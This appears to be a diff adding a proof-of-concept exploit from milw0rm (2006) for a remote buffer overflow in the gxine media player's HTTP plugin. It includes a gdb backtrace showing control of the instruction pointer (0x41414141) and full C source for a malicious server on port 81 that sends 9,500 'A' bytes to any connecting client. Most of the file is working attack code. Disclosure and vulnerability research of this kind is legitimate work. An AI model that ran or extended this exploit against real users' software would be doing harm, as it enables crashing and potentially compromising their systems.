@@ -1,0 +1,95 @@
+//////////////////////////////////////////////////////
+// gxine - HTTP Plugin Remote Buffer Overflow PoC
+/////////////////////////////////////////////////////
+//
+// Federico L. Bossi Bonin
+// fbossi[at]netcomm[dot]com[dot]ar
+/////////////////////////////////////////////////////
+
+// TESTED on gxine 0.5.6
+////////////////////////
+
+// 0xb78eccc7 in free () from /lib/tls/libc.so.6
+// (gdb) backtrace
+// #0  0xb78eccc7 in free () from /lib/tls/libc.so.6
+// #1  0xb7438fc8 in ?? () from /usr/lib/xine/plugins/1.1.1/xineplug_inp_http.so
+// #2  0x41414141 in ?? ()
+// #3  0xb7f42164 in ?? () from /usr/lib/libxine.so.1
+// #4  0x080b1810 in ?? ()
+// #5  0xb7f0e635 in xine_open () from /usr/lib/libxine.so.1
+// #6  0xb7f3967f in ?? () from /usr/lib/libxine.so.1
+// #7  0x0877c084 in ?? ()
+// #8  0x0930a931 in ?? ()
+// #9  0x080880a2 in defs.3 ()
+// #10 0xb0088478 in ?? ()
+// #11 0x00000000 in ?? ()
+
+#include <stdio.h>
+#include <sys/types.h> 
+#include <sys/socket.h>
+#include <netinet/in.h>
+#define PORT 81
+#define LEN 9500
+
+void shoot(int);
+
+int main() {
+struct sockaddr_in srv_addr, client;
+int len,pid,sockfd,sock;
+
+sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+if (sockfd < 0) { 
+perror("error socket()"); 
+exit(1);
+}
+     
+bzero((char *) &srv_addr, sizeof(srv_addr));
+srv_addr.sin_family = AF_INET;
+srv_addr.sin_addr.s_addr = INADDR_ANY;
+srv_addr.sin_port = htons(PORT);
+
+if (bind(sockfd, (struct sockaddr *) &srv_addr,sizeof(srv_addr)) < 0)  {
+perror("error bind()");
+exit(1);
+}
+
+
+
+printf("Listening on port %i\n",PORT);
+
+listen(sockfd,5);
+len = sizeof(client);
+
+while (1) {
+sock = accept(sockfd, (struct sockaddr *) &client, &len);
+if (sock < 0)  {
+perror("error accept()");
+exit(1);
+}
+
+pid = fork();
+if (pid < 0)  {
+perror("fork()");
+exit(1);
+}
+if (pid == 0)  {
+close(sockfd);
+printf("Conection from %s\n",inet_ntoa(client.sin_addr));
+shoot(sock);
+exit(0);
+}
+else close(sock);
+} 
+return 0;
+}
+
+void shoot (int sock) {
+int i;
+for (i=0 ; i < LEN ; i++) {
+write(sock,"\x41",1);
+}
+
+}
+
+// milw0rm.com [2006-05-30]
